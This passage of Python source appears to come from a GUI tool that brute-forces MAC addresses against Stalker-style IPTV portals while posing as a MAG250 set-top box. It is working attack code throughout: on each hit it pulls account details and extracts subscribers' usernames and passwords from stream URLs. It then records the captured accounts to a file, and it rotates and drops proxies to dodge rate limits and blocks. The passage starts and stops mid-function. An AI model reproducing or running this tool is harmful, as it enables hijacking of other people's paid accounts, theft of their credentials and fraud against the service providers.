                    logging.debug(f"Status Code: {res.status_code}")
                    #if res.status_code == 404:
                    #    logging.debug("404") # Nothing to do about this, as some portals return 404 on failed login.

                    if custommacs:
                        if (
                            (
                                res.status_code == 200
                                or res.status_code == 204
                                or res.status_code == 404
                                or res.status_code == 512
                            )
                            and not "REMOTE_ADDR" in res.text
                            and not "Backend not available" in res.text
                        ):
                            if self.mac_dict:  # Check if the deque is not empty
                                if self.prefer_accuracy_radio.isChecked():
                                    if (
                                        mac in self.mac_dict
                                    ):  # Check if the mac is in the deque
                                        self.mac_dict.remove(
                                            mac
                                        )  # Remove the specific MAC address
                                        logging.debug(f"removing {mac} from deque")
                            else:
                                # Handle the case when the deque is empty
                                logging.info("Pool is empty, cannot pop anything.")
                        if self.prefer_speed_radio.isChecked():
                            if self.mac_dict:
                                self.mac_dict.remove(
                                    mac
                                )  # Remove the specific MAC address                            
                    logging.info(f"Response Text: {res.text}")
                    logging.debug(f"Response Headers: {res.headers}")
                    token = None
                    if res.text:
                        data = json.loads(res.text)
                        token = data.get("js", {}).get("token")
                        token_random = data.get("js", {}).get(
                            "random"
                        )  # Extract 'random' if present

                    if token:
                        token_random = None
                        token_random = (
                            res.json().get("js", {}).get("random")
                        )  # Extract 'random' if present
                        logging.info(f"Token retrieved: {token}")

                        if token_random:
                            logging.info(f"RANDOM: {token_random}")
                            sig = (
                                hashlib.sha256(token_random.encode())
                                .hexdigest()
                                .upper()
                            )

                            metrics = {
                                "mac": mac,
                                "sn": sn,
                                "type": "STB",
                                "model": "MAG250",
                                "uid": device_id,
                                "random": token_random,
                            }
                            json_string = json.dumps(metrics)
                            encoded_string = urllib.parse.quote(json_string)
                        else:

                            token_random = 0
                            sig = hashlib.sha256(snmac.encode()).hexdigest().upper()

                            metrics = {
                                "mac": mac,
                                "sn": sn,
                                "type": "STB",
                                "model": "MAG250",
                                "uid": device_id,
                                "random": token_random,
                            }
                            json_string = json.dumps(metrics)
                            encoded_string = urllib.parse.quote(json_string)

                        logging.debug(encoded_string)
                        macattacksess.headers.update(
                            {
                                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                                "Accept-Encoding": "identity",
                                "Accept": "*/*",
                                "Connection": "keep-alive",
                                "Authorization": f"Bearer {token}",
                                "X-Random": f"{token_random}",
                            }
                        )

                        macattacksess.cookies.update(
                            {
                                "adid": hw_version_2,
                                "debug": "1",
                                "device_id2": device_id2,
                                "device_id": device_id,
                                "hw_version": "1.7-BD-00",
                                "mac": mac,
                                "sn": sn,
                                "stb_lang": "en",
                                "timezone": "America/Los_Angeles",
                            }
                        )

                        url1_a = f"{base_url}{portaltype}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: {self.portal_version}; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&sig={sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={metrics}&hw_version_2={hw_version_2}&timestamp={round(time.time())}&api_sig=262&prehash=0"
                        # Activate the portal by getting the profile with the correct headers cookies and id's
                        res1_a = macattacksess.get(url1_a)
                        logging.debug(res1_a.text)
                        client_ip = None
                        exp_billing = None
                        if res1_a.text:
                            data = json.loads(res1_a.text)
                            if "js" in data and "ip" in data["js"]:
                                client_ip = data["js"]["ip"]

                            if "js" in data and "expire_billing_date" in data["js"]:
                                exp_billing = data["js"]["expire_billing_date"]

                        url2 = f"{base_url}{portaltype}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"

                        res2 = macattacksess.get(
                            url2, timeout=timeout, allow_redirects=False
                        )

                        logging.info(f"2Status Code: {res2.status_code}")
                        logging.debug(f"2Response Text: {res2.text}")
                        logging.info(f"2Response Headers: {res2.headers}")

                        if res2.text:
                            data = json.loads(res2.text)
                            if (
                                "js" in data
                                and "mac" in data["js"]
                                and "phone" in data["js"]
                            ):
                                mac = data["js"]["mac"]
                                expiry = data["js"]["phone"]
                                if expiry == "":
                                    expiry = "Unknown"
                                    if exp_billing:
                                        # Convert the exp date format
                                        dt_object = datetime.strptime(
                                            exp_billing, "%Y-%m-%d %H:%M:%S"
                                        )
                                        exp_billing = dt_object.strftime(
                                            "%B %d, %Y, %I:%M %p"
                                        )
                                        expiry = exp_billing

                                try:
                                    # Try to convert the string to an integer (it could be a Unix timestamp)
                                    timestamp = int(expiry)
                                    expiry = datetime.utcfromtimestamp(
                                        timestamp
                                    ).strftime("%B %d, %Y, %I:%M %p")
                                except ValueError:
                                    # If it fails, it likely is already in a human-readable format
                                    pass

                                logging.debug(expiry)

                                url3 = f"{base_url}{portaltype}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
                                res3 = macattacksess.get(
                                    url3,
                                    timeout=timeout,
                                    allow_redirects=False,
                                )
                                count = 0
                                if res3.status_code == 200:

                                    url4 = f"{base_url}{portaltype}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
                                    res4 = macattacksess.get(
                                        url4,
                                        timeout=timeout,
                                        allow_redirects=False,
                                    )

                                    try:
                                        data4 = json.loads(res4.text)

                                        # Check if "js" and "cmd" keys exist
                                        js_data = data4.get("js", {})
                                        cmd_value4 = js_data.get("cmd", None)

                                        if cmd_value4:
                                            logging.info(cmd_value4)
                                            cmd_value4 = cmd_value4.replace(
                                                "ffmpeg ", "", 1
                                            )

                                            cmd_value4 = cmd_value4.replace(
                                                "'ffmpeg' ", ""
                                            )

                                            logging.info(f"CMD Value: {cmd_value4}")

                                            # Parse the URL
                                            parsed_url = urlparse(cmd_value4)
                                            backend_host = parsed_url.hostname
                                            domain_and_port = (
                                                f"{parsed_url.scheme}://{parsed_url.hostname}:{parsed_url.port}"
                                                if parsed_url.port
                                                else f"{parsed_url.scheme}://{parsed_url.hostname}"
                                            )

                                            logging.debug(f"Backend: {domain_and_port}")

                                            # Extract path parts
                                            path_parts = parsed_url.path.strip(
                                                "/"
                                            ).split("/")
                                            userfound = 0
                                            username = None
                                            password = None

                                            if include_user_creds:
                                                if len(path_parts) >= 3:
                                                    username = path_parts[0]
                                                    password = path_parts[1]
                                                    logging.debug(
                                                        f"Username: {username}"
                                                    )
                                                    logging.debug(
                                                        f"Password: {password}"
                                                    )
                                                    userfound = 1  # Set userfound to 1 if username and password are found
                                        else:
                                            logging.debug(
                                                "CMD value not found in the response."
                                            )
                                            userfound = 0

                                    except json.JSONDecodeError as e:
                                        logging.debug(f"Failed to parse JSON: {e}")
                                        userfound = 0
                                    if userfound == 1:
                                        xtream_url = f"{base_url}/player_api.php?username={username}&password={password}"
                                        resxtream = macattacksess.get(
                                            xtream_url,
                                            timeout=timeout,
                                            allow_redirects=False,
                                        )

                                        dataxtream = json.loads(resxtream.text)
                                        logging.debug(dataxtream)

                                        # Extracting the values

                                        if "active_cons" in dataxtream["user_info"]:
                                            try:
                                                active_cons = int(
                                                    dataxtream["user_info"][
                                                        "active_cons"
                                                    ]
                                                )
                                            except (ValueError, TypeError):
                                                active_cons = None  # In case of error, set it to None
                                        if "max_connections" in dataxtream["user_info"]:
                                            try:
                                                max_connections = int(
                                                    dataxtream["user_info"][
                                                        "max_connections"
                                                    ]
                                                )
                                            except (ValueError, TypeError):
                                                max_connections = None  # In case of error, set it to None
                                        # If the data contains a valid 'created_at' timestamp, process it
                                        if "created_at" in dataxtream["user_info"]:
                                            try:
                                                created_at_timestamp = int(
                                                    dataxtream["user_info"][
                                                        "created_at"
                                                    ]
                                                )
                                                created_at = datetime.fromtimestamp(
                                                    created_at_timestamp, timezone.utc
                                                ).strftime("%B %d, %Y, %I:%M %p")
                                            except (ValueError, TypeError):
                                                created_at = None  # In case of error, set it to None

                                        # Printing or storing the values
                                        logging.debug(
                                            f"Active connections: {active_cons}"
                                        )
                                        logging.debug(
                                            f"Max connections: {max_connections}"
                                        )
                                        logging.debug(f"Created at: {created_at}")

                                        # Construct the URL for the m3u file
                                        # m3ufile = f"{self.base_url}/get.php?username={username}&password={password}&type=m3u_plus"

                                        # Send a HEAD request to check if the file exists
                                        # response = macattacksess.head(
                                        #    m3ufile, timeout=timeout, allow_redirects=False
                                        # )

                                        # Check the status code to determine if the file exists
                                        # if response.status_code == 200:
                                        #    logging.info(f"{m3ufile} exists.")
                                        # elif response.status_code == 404:
                                        #    logging.info("The m3u file does not exist.")
                                        # else:
                                        #    logging.info(
                                        #        f"Received status code {response.status_code}: Unable to check file existence."
                                        #    )

                                    else:
                                        logging.debug(
                                            "Less than 2 subdirectories found in the path."
                                        )
                                        userfound = 0
                                    try:
                                        response_data = json.loads(res3.text)
                                        if (
                                            isinstance(response_data, dict)
                                            and "js" in response_data
                                            and "data" in response_data["js"]
                                        ):
                                            channels_data = response_data["js"]["data"]
                                            count = len(channels_data)
                                        else:
                                            #    self.update_error_text_signal.emit(
                                            #        "Unexpected data structure for channels."
                                            #    )
                                            count = 0
                                    except (
                                        TypeError,
                                        json.decoder.JSONDecodeError,
                                    ) as e:
                                        logging.info(
                                            f"Data parsing error for channels data: {str(e)}"
                                        )
                                        count = 0
                                # new output changes

                                if count > 0:
                                    logging.info("Mac found")

                                    if self.autoloadmac_checkbox.isChecked():
                                        self.hostname_input.setText(iptv_url)
                                        self.mac_input.setText(mac)
                                    if self.output_file is None:
                                        output_filename = self.OutputMastermind()
                                        self.output_file = open(
                                            output_filename, "a", encoding="utf-8"
                                        )  # Ensure UTF-8 encoding

                                    def resolve_ip_address(hostname, default_message):
                                        try:
                                            return socket.gethostbyname(hostname)
                                        except socket.gaierror:
                                            logging.info(
                                                f"Unable to resolve the IP address for {hostname}."
                                            )
                                            return default_message

                                    def get_location(ip_address=""):
                                        # Get location details for an IP address using ipinfo.io API.
                                        # url = f"https://ipinfo.io/{ip_address}/json"
                                        url = f"http://ip-api.com/json/{ip_address}"
                                        # url = f"http://ip-api.com/json/{ip_address}"
                                        try:
                                            with no_proxy_environment():  # Bypass the enviroment proxy set in the video player tab
                                                response = requests.get(url)
                                                response.raise_for_status()
                                                data = response.json()
                                                return {
                                                    "City": data.get("regionName"),
                                                    "Country": data.get("country"),
                                                    "Timezone": data.get("timezone"),
                                                }
                                        except (
                                            requests.exceptions.RequestException
                                        ) as e:
                                            return {"error": str(e)}

                                    # Resolve middleware IP address
                                    parsed_middleware = urlparse(base_url)
                                    middleware_hostname = parsed_middleware.hostname

                                    if include_ip_addresses:
                                        middleware_ip_address = resolve_ip_address(
                                            middleware_hostname, "No Portal?"
                                        )
                                    if (
                                        include_ip_addresses
                                        and include_location_and_timezone
                                    ):
                                        # Get the location details for the middleware IP address
                                        middleware_location = get_location(
                                            middleware_ip_address
                                        )
                                        middleware_city = middleware_location.get(
                                            "City", "Unknown"
                                        )
                                        middleware_country = middleware_location.get(
                                            "Country", "Unknown"
                                        )
                                        middleware_timezone = middleware_location.get(
                                            "Timezone", "Unknown"
                                        )

                                        # Get the location details for the client IP address
                                        client_location = get_location(client_ip)
                                        client_city = client_location.get(
                                            "City", "Unknown"
                                        )
                                        client_country = client_location.get(
                                            "Country", "Unknown"
                                        )

                                    if (
                                        include_proxy_location
                                        and selected_proxy != "Your Connection"
                                    ):
                                        # Strip the port
                                        proxy_ip = selected_proxy.split(":")[0]
                                        proxy_location = get_location(proxy_ip)
                                        proxy_city = (
                                            proxy_location.get("City", "Unknown")
                                            if proxy_location
                                            else ""
                                        )
                                        proxy_country = (
                                            proxy_location.get("Country", "Unknown")
                                            if proxy_location
                                            else ""
                                        )

                                    current_time = datetime.now().strftime(
                                        "%B %d, %Y, %I:%M %p"
                                    )

                                    backend_ip_address = None

                                    if include_ip_addresses and backend_host:
                                        try:
                                            backend_ip_address = resolve_ip_address(
                                                backend_host, "0.0.0.0"
                                            )
                                        except Exception as e:
                                            logging.error(
                                                f"Error resolving IP address for {hostname}: {e}"
                                            )
                                            backend_ip_address = None

                                    if (
                                        include_backend_info
                                        and include_ip_addresses
                                        and include_location_and_timezone
                                        and backend_ip_address is not None
                                    ):
                                        backend_location = (
                                            get_location(backend_ip_address)
                                            if middleware_ip_address
                                            != backend_ip_address
                                            else None
                                        )

                                        backend_city = (
                                            backend_location.get("City", "Unknown")
                                            if backend_location
                                            else ""
                                        )
                                        backend_country = (
                                            backend_location.get("Country", "Unknown")
                                            if backend_location
                                            else ""
                                        )
                                        backend_timezone = (
                                            backend_location.get("Timezone", "Unknown")
                                            if backend_location
                                            else ""
                                        )

                                    if include_genres: # OK, I made this way too stupid(and it hurt my brain), but it works, and I like it!
                                        title_max_length = 16 # Cut off end of titles afther this many chars
                                        title_columns = 4
                                        titles_str = None
                                        titles_grid = None
                                        genres_url = f"{base_url}{portaltype}?type=itv&action=get_genres&JsHttpRequest=1-xml"
                                        res_genres = macattacksess.get(genres_url)
                                        
                                        if res_genres.text:
                                            def modify_title(title, title_max_length):
                                                title = re.sub(r'[^\x00-\x7F]+', ' ', title) # Remove non-ASCII characters so the blocks touch eachother
                                                title = re.sub(r'\|(?!\s)', '', title) # Remove pipes not followed by a space
                                                # Pad the title with blank spaces if it's shorter than title_max_length
                                                if len(title) < title_max_length:
                                                    title = title + ' ' * (title_max_length - len(title))
                                                
                                                title = title + "▐"
                                                
                                                return title

                                            data = json.loads(res_genres.text)
                                            data['js'] = [genre for genre in data['js'] if genre['id'] != "*"] # Remove the "ALL" title
                                            # Store the original genres in orig_genres
                                            orig_genres = ', '.join(genre['title'] for genre in data['js'])
                                            
                                            # Modify the titles as needed for further processing
                                            titles = [modify_title(genre['title'], title_max_length) for genre in data['js']]
                                            titles_str = ', '.join(titles)
                                            
                                            titles_list = titles_str.split(", ")

                                            formatted_titles = []
                                            for title in titles_list:
                                                # Clean and truncate each title if longer than title_max_length
                                                truncated_title = modify_title(title[:title_max_length].rstrip(), title_max_length)
                                                formatted_titles.append(truncated_title)

                                            rows = [formatted_titles[i:i + title_columns] for i in range(0, len(formatted_titles), title_columns)]
                                            
                                            if len(rows[-1]) < title_columns:
                                                rows[-1] += [''] * (title_columns - len(rows[-1]))

                                            def format_row(row, idx, title_max_length):
                                                formatted_titles = " ".join(title.ljust(title_max_length) for title in row)
                                                if idx == 0:
                                                    return "▌ " + formatted_titles
                                                else:
                                                    return f"{'':<11}▌ " + formatted_titles 

                                            def generate_titles_grid(rows, title_max_length):
                                                return "\n".join(format_row(row, idx, title_max_length) for idx, row in enumerate(rows))

                                            titles_grid = generate_titles_grid(rows, title_max_length)
                                            
                                            logging.debug(f"Original Genres: {orig_genres}")
                                            logging.debug(f"Formatted Titles Grid:\n{titles_grid}")
                                    if include_vod:
                                        title_max_length = 16 # Cut off end of titles afther this many chars
                                        title_columns = 4
                                        vod_str = None
                                        vod_grid = None
                                        vod_url = f"{base_url}{portaltype}?type=vod&action=get_categories&JsHttpRequest=1-xml"
                                        res_vod = macattacksess.get(vod_url)
                                        
                                        if res_vod.text:
                                            def modify_vod(title, title_max_length):
                                                #title = re.sub(r'[^\x00-\x7F]+', ' ', title) # Remove non-ASCII characters so the blocks touch eachother
                                                title = re.sub(r'\|(?!\s)', '', title) # Remove pipes not followed by a space
                                                
                                                # Pad the title with blank spaces if it's shorter than title_max_length
                                                if len(title) < title_max_length:
                                                    title = title + ' ' * (title_max_length - len(title))
                                                
                                                title = title + "▐"
                                                
                                                return title

                                            data = json.loads(res_vod.text)
                                            data['js'] = [genre for genre in data['js'] if genre['id'] != "*"] # Remove the "ALL" title
                                            # Store the original genres in orig_genres
                                            orig_vods = ', '.join(genre['title'] for genre in data['js'])
                                            
                                            # Modify the titles as needed for further processing
                                            titles = [modify_vod(genre['title'], title_max_length) for genre in data['js']]
                                            vod_str = ', '.join(titles)
                                            
                                            vod_list = vod_str.split(", ")

                                            formatted_titles = []
                                            for title in vod_list:
                                                # Clean and truncate each title if longer than title_max_length
                                                truncated_title = modify_vod(title[:title_max_length].rstrip(), title_max_length)
                                                formatted_titles.append(truncated_title)

                                            rows = [formatted_titles[i:i + title_columns] for i in range(0, len(formatted_titles), title_columns)]
                                            
                                            if len(rows[-1]) < title_columns:
                                                rows[-1] += [''] * (title_columns - len(rows[-1]))

                                            def format_row(row, idx, title_max_length):
                                                formatted_titles = " ".join(title.ljust(title_max_length) for title in row)
                                                if idx == 0:
                                                    return "▌ " + formatted_titles
                                                else:
                                                    return f"{'':<11}▌ " + formatted_titles 

                                            def generate_titles_grid(rows, title_max_length):
                                                return "\n".join(format_row(row, idx, title_max_length) for idx, row in enumerate(rows))

                                            vods_grid = generate_titles_grid(rows, title_max_length)
                                            
                                            logging.debug(f"Original Genres: {orig_vods}")
                                            logging.debug(f"Formatted Titles Grid:\n{vods_grid}")

                                    result_message = (
                                        f"{'Portal  :':<10} {iptv_url}\n"
                                    )
                                    result_message += f"{'MAC Addr:':<10} {mac}\n"

                                    if include_ip_addresses and middleware_ip_address:
                                        result_message += (
                                            f"{'PortalIP:':<10} {middleware_ip_address}"
                                        )

                                    if (
                                        include_location_and_timezone
                                        and include_ip_addresses
                                        and middleware_city
                                        and middleware_city != "Unknown"
                                        and middleware_timezone != "Unknown"
                                    ):
                                        result_message += (
                                            f" ({middleware_city}, {middleware_country})\n"
                                            f"{'Timezone:':<10} {middleware_timezone}\n"
                                        )
                                    elif include_ip_addresses and middleware_ip_address:
                                        result_message += "\n"

                                    if include_deviceids:
                                        result_message += f"{'DeviceID:':<10} {device_id}\n{'SecondID:':<10} {device_id2}\n{'Serial #:':<10} {sn}\n"

                                    if (
                                        include_backend_info
                                        and domain_and_port
                                        and middleware_ip_address != backend_ip_address
                                    ):
                                        result_message += (
                                            f"{'Backend :':<10} {domain_and_port}\n"
                                        )
                                        if include_ip_addresses and backend_ip_address:
                                            result_message += f"{'IP Addr :':<10} {backend_ip_address}"
                                        if (
                                            include_location_and_timezone
                                            and middleware_ip_address
                                            != backend_ip_address
                                            and backend_city
                                        ):
                                            result_message += (
                                                f" ({backend_city}, {backend_country})\n"
                                                f"{'Timezone:':<10} {backend_timezone}\n"
                                            )
                                        elif include_deviceids:
                                            result_message += "\n"

                                    if include_ip_addresses and client_ip:
                                        result_message += (
                                            f"{'ClientIP:':<10} {client_ip}"
                                        )

                                    if (
                                        include_location_and_timezone
                                        and include_ip_addresses
                                        and client_city
                                        and client_city != "Unknown"
                                    ):
                                        result_message += (
                                            f" ({client_city}, {client_country})\n"
                                        )
                                    elif include_ip_addresses and client_ip:
                                        result_message += "\n"

                                    if (
                                        include_proxy_used
                                        and selected_proxy != "Your Connection"
                                    ):
                                        result_message += (
                                            f"{'Proxy IP:':<10} {selected_proxy}"
                                        )

                                    if (
                                        include_proxy_location
                                        and selected_proxy != "Your Connection"
                                        and include_proxy_used
                                        and proxy_city != "Unknown"
                                    ):
                                        result_message += (
                                            f" ({proxy_city}, {proxy_country})\n"
                                        )
                                    elif (
                                        include_proxy_used
                                        and selected_proxy != "Your Connection"
                                    ):
                                        result_message += "\n"

                                    if (
                                        include_user_creds
                                        and username is not None
                                        and password is not None
                                    ):  # checks if include_user_creds is True and username isn't empty
                                        result_message += f"{'Username:':<10} {username}\n{'Password:':<10} {password}\n"

                                    if include_max_connections and max_connections:
                                        result_message += (
                                            f"{'Max Conn:':<10} {max_connections}\n"
                                        )
                                    if include_date_found:
                                        result_message += (
                                            f"{'Found on:':<10} {current_time}\n"
                                        )
                                    if include_date_created and created_at is not None:
                                        result_message += (
                                            f"{'Creation:':<10} {created_at}\n"
                                        )

                                    result_message += f"{'Exp date:':<10} {expiry}\n{'Channels:':<10} {count}\n"

                                    file_message = result_message
                                    if include_genres and titles_str:
                                        result_message += f"{'Playlist:':<10} {titles_grid}\n"
                                        file_message += f"{'Playlist:':<10} {orig_genres}\n"
                                        
                                        
                                    if include_vod and vod_str:
                                        result_message += f"{'VOD list:':<10} {vods_grid}\n"
                                        file_message += f"{'VOD list:':<10} {orig_vods}\n"
                                        



                                    if not mac in self.recentlyfound:
                                        if not hasattr(self, "hits"):
                                            self.hits = 1
                                        else:
                                            self.hits += 1
                                        self.add_recently_found(
                                            mac
                                        )
                                        self.update_output_text_signal.emit(
                                            result_message
                                        )

                                        # Replace the grid with the list for the file
                                        #if include_genres and titles_str and titles_grid:
                                        #    result_message = result_message.replace(titles_grid, orig_genres)
                                        #    logging.debug("Replacing playlist grid with list for file")
                                        #if include_vod and vod_str and vods_grid:
                                        #    result_message = result_message.replace(vods_grid, orig_vods)
                                        #    logging.debug("Replacing vod grid with list for file")
                                        self.output_file.write(file_message + "\n")
                                        self.output_file.flush()

                                        if self.successsound_checkbox.isChecked():
                                            sound_thread = threading.Thread(
                                                target=self.play_success_sound
                                            )
                                            sound_thread.start()  # Start the background thread

                                        if self.autostop_checkbox.isChecked():
                                            logging.debug(
                                                "autostop_checkbox is checked, stopping..."
                                            )
                                            self.stop_button.click()
                                else:
                                    logging.debug(
                                        f"MAC: {mac} connects, but has 0 channels. Bummer."
                                    )
                            else:
                                # self.update_error_text_signal.emit(f"No JSON response for MAC {mac}")
                                logging.info(f"No JSON response for MAC {mac}")
                                self.proxy_error_counts[selected_proxy] = 0
                                self.proxy_error_connect_counts[selected_proxy] = 0
                if selected_proxy in self.proxy_error_counts:
                    del self.proxy_error_counts[selected_proxy]
                if selected_proxy in self.proxy_error_connect_counts:
                    del self.proxy_error_connect_counts[selected_proxy]            
            # Try failed because data was non json
            except (
                json.decoder.JSONDecodeError,
                requests.exceptions.RequestException,
                TypeError,
            ) as e:

                logging.info(f"~No JSON {str(e)}")
                # logging.info(f"Response {res.text}")
                if "Expecting value" in str(e):
                    # logging.debug(f"Raw Response Content:\n{mac}\n%s", res.text)
                    if (
                        "503 Service" in res.text
                        or "521: Web server is down" in res.text
                        or "temporarily unavailable" in res.text
                    ):
                        if ratelimit_timeout > 0:                        
                            self.update_error_text_signal.emit(
                                f"Error for Portal: <b>503 Rate Limited</b> {selected_proxy}"
                            )
                            if self.temp_remove_proxy(selected_proxy):  # Temp remove the proxy
                                logging.info("RATELIMITED ALT METHOD")
                                time.sleep(self.remove_for_seconds_spinbox.value()) #sleep the thread if alt speed enabled

                    elif "ERR_ACCESS_DENIED" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                            self.update_error_text_signal.emit(
                                f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Access Denied</b> Proxy refused access."
                            )
                            if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                                break
                    elif (
                        "Could not connect" in res.text
                        or "Network is unreachable" in res.text
                        or "Non-compliance" in res.text
                        or "Connection timed out" in res.text
                        or "URL could not be retrieved" in res.text
                        or "ISOLIR" in res.text
                        or "queue was full" in res.text
                        or "logoSophosFooter" in res.text
                        or "connection_error" in res.text
                        or "ERR_CONNECT_FAIL" in res.text
                        or "An error occurred." in res.text
                        or "Zscaler" in res.text
                        or "The server is not responding" in res.text
                        or "remote server did not respond to the proxy" in res.text
                    ):
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Could not connect</b> proxy Could not connect."
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif (
                        "Blocked" in res.text
                        or "Not authenticated" in res.text
                        or "407 Proxy Authentication Required" in res.text
                    ):
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Access Denied</b> blocked access"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "Access Denied" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Access Denied</b> blocked access"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "socket: " in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Socket Error</b> proxy socket error"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "Error code 520" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Error code 520</b> >Unknown error"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "502 Proxy Error" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>502 Proxy Error</b> proxy server issue"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif (
                        "500 Internal Server Error" in res.text
                        or "server misbehaving" in res.text
                        or "server error" in res.text
                        or "generateText('internal_error')" in res.text
                    ):
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>500 Internal Server Error</b> proxy server issue"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "Host header port mismatch" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Host header port mismatch</b> proxy port does not match"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "connections reached" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Proxy Overloaded</b> Maximum number of open connections reached."
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "address already in use" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Address already in use</b> Proxy's port unavailable."
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif (
                        "DNS resolution error" in res.text
                        or "DNS lookup failed" in res.text
                        or "ERR_DNS_FAIL" in res.text
                    ):
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>DNS resolution error</b> DNS Issue with proxy"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "ERR_DNS_FAIL" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>DNS resolution error</b> DNS Issue with proxy"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif "302 Found" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(
                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>302 Found</b> Proxy tried to redirect us"
                        )
                        if self.remove_proxy(selected_proxy, self.proxy_error_counts):
                            break
                    elif (
                        "504 Gateway" in res.text
                        or "Gateway Timeout" in res.text
                        or "i/o timeout" in res.text
                    ):
                        if self.proxy_enabled_checkbox.isChecked():
                            
                            # Track error count for the proxy
                            if selected_proxy not in self.proxy_error_counts:
                                self.proxy_error_counts[selected_proxy] = 1
                            else:
                                self.proxy_error_counts[selected_proxy] += 1
                            self.update_error_text_signal.emit(
